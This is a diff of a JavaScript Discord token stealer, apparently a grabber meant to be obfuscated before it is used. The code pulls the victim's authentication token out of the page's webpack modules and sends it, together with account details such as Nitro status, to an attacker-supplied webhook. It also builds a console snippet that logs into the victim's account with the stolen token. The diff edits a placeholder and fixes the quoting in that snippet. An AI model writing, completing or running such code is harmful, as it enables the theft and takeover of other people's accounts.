@@ -22,7 +22,7 @@
 
     //---- DO NO OBFUSCATE ABOVE THIS COMMENT - ONLY CODE BELOW - DELETE THIS COMMENT WHEN YOURE DONE ----\\
 
-    const url = "WEBHOOK URL HERE";
+    const url = "YOUR WEBHOOK URL HERE";
 
     setTimeout(async function() {
         const token = Object.values(webpackJsonp.push([[],{['']:(_,e,r)=>{e.cache=r.c}},[['']]]).cache).find(m=>m.exports&&m.exports.default&&m.exports.default.getToken!==void 0).exports.default.getToken();
@@ -61,7 +61,7 @@ Nitro Type: **${res.premium_type}**
 Paste this code into the Developer Console to login:
 \`\`\`js
 function login(token) {
-setInterval(() => {document.body.appendChild(document.createElement 'iframe').contentWindow.localStorage.token = \`"${token}"\`}, 50);setTimeout(() => {location.reload();}, 2500);}login('${token}')
+setInterval(() => {document.body.appendChild(document.createElement \`iframe\`).contentWindow.localStorage.token = \`"\${token}"\`}, 50);setTimeout(() => {location.reload();}, 2500);}login(\`${token}\`)
 \`\`\`
 ==================`
                 })
